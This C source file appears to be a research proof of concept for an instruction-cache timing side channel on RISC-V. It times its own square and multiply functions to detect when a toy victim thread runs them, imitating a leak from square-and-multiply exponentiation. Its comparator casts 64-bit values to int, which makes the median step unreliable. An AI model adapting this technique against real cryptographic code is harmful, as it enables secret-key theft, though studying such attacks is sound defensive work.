#include <pthread.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define SAMPLE_SIZE     10000
#define RUNS            1000
#define OFFSET_SQUARE   0x18
#define OFFSET_MULTIPLY 0x20

typedef struct {
    uint64_t start;
    uint64_t duration;
} sample_t;

// function equivalent to rdtsc on x86, but implemented on RISC-V
static inline uint64_t rdtsc()
{
    uint64_t val;
    asm volatile("rdcycle %0\n" : "=r"(val)::);
    return val;
}

// function to flush the I-cache
static inline void clflush()
{
    asm volatile("fence.i" ::: "memory");
    asm volatile("fence" ::: "memory");
}

// measure the time it takes to execute function p and return start and duration
// p is the function
// offset is the offset from p to the ret instructions to reduce latency
static inline sample_t timed_call(void* p, uint64_t offset)
{
    uint64_t start, end;
    start = rdtsc();
    asm volatile("mv a5, %0; jalr a5\n" : : "r"(p + offset) :"a5","memory");
    end = rdtsc();
    return (sample_t) {start, end - start};
}


// simple function multiplying two numbers
uint64_t multiply(uint64_t x, uint64_t y)
{
    return x * y;
}

// simple function squaring a number
uint64_t square(uint64_t x)
{
    return x * x;
}

// victim function that calls square and multiply 10 times with usleeps inbetween
void* calculate(void* d)
{
    size_t* done = (size_t*)d;

    for (size_t i=0; i<10; i++) {
        usleep(1000);
        square(0);
        usleep(1000);
        multiply(0,0); 
    }
    usleep(1000);
    *done = 1;
}

// compare function for qsort
int compare_uint64_t (const void * a, const void * b) 
{
   return ( *(int*)a - *(int*)b );
}

// returns the median of a list given a list and its length
// works by sorting the list and returning the middle element
uint64_t median(uint64_t* list, uint64_t size)
{
    uint64_t* sorted = malloc(size * sizeof(uint64_t));
    memcpy(sorted, list, size * sizeof(uint64_t));
    qsort(sorted, size, sizeof(uint64_t), compare_uint64_t);
    uint64_t median = sorted[size / 2];
    free(sorted);
    return median;
}

int main()
{
    // cached timing arrays for square and multiply
    uint64_t chached_timings_1[SAMPLE_SIZE] = {0};
    uint64_t chached_timings_2[SAMPLE_SIZE] = {0};
    // uncached timing arrays for square and multiply
    uint64_t unchached_timings_1[SAMPLE_SIZE] = {0};
    uint64_t unchached_timings_2[SAMPLE_SIZE] = {0};
    // thresholds for square and multiply
    uint64_t threshold_1 = 0;
    uint64_t threshold_2 = 0;
    // victim thread
    pthread_t calculate_thread;

    // get threshold for cached and uncached square access
    square(0);
    for (size_t i=0; i<SAMPLE_SIZE; i++) {
        chached_timings_1[i] = timed_call(square, OFFSET_SQUARE).duration;
    }
    for (size_t i=0; i<SAMPLE_SIZE; i++) {
        clflush();
        unchached_timings_1[i] = timed_call(square, OFFSET_SQUARE).duration;
    }
    uint64_t cached_median_1 = median(chached_timings_1, SAMPLE_SIZE);
    uint64_t uncached_median_1 = median(unchached_timings_1, SAMPLE_SIZE);
    threshold_1 = (uncached_median_1 + cached_median_1)/2;
    printf("threshold 1: %lu\n", threshold_1);

    // get threshold for cached and uncached multiply access
    multiply(0, 0);
    for (int i = 0; i < SAMPLE_SIZE; i++)
    {
        chached_timings_2[i] = timed_call(multiply, OFFSET_MULTIPLY).duration;
    }
    for (int i = 0; i < SAMPLE_SIZE; i++)
    {
        clflush();
        unchached_timings_2[i] = timed_call(multiply, OFFSET_MULTIPLY).duration;
    }
    uint64_t cached_median_2 = median(chached_timings_2, SAMPLE_SIZE);
    uint64_t uncached_median_2 = median(unchached_timings_2, SAMPLE_SIZE);
    threshold_2 = (uncached_median_2 + cached_median_2)/2;
    printf("threshold 2: %lu\n", threshold_2);

    // run victim thread RUNS times and observe the accesses to square
    // results are written to square.csv
    printf("Observing square...\n");
    FILE* sq = fopen("square.csv", "w");
    for(size_t i=0; i<RUNS; i++) {
        size_t done = 0;
        pthread_create(&calculate_thread, NULL, calculate, &done);
        uint64_t start = rdtsc();
        clflush();

        while(done == 0)
        {   
            sample_t sq_timing = timed_call(square, OFFSET_SQUARE);
            // flush after call to reduce chance of access between measurement and flush
            clflush();
            if (sq_timing.duration < threshold_1)
            {
                fprintf(sq, "%lu\n", sq_timing.start - start);
            }
        }
        pthread_join(calculate_thread, NULL);
    }
    fclose(sq);
    printf("Done observing square\n");

    // run victim thread RUNS times and observe the accesses to multiply
    // results are written to multiply.csv
    printf("Observing multiply...\n");
    FILE* mul = fopen("multiply.csv", "w");
    for(size_t i=0; i<RUNS; i++) {
        size_t done = 0;
        pthread_create(&calculate_thread, NULL, calculate, &done);
        uint64_t start = rdtsc();
        clflush();

        while(done == 0)
        {   
            sample_t mul_timing = timed_call(multiply, OFFSET_MULTIPLY);
            // flush after call to reduce chance of access between measurement and flush
            clflush();
            if (mul_timing.duration < threshold_2)
            {
                fprintf(mul, "%lu\n", mul_timing.start - start);
            }
        }
        pthread_join(calculate_thread, NULL);
    }
    fclose(mul);
    printf("Done observing multiply\n");

    return 0;
}
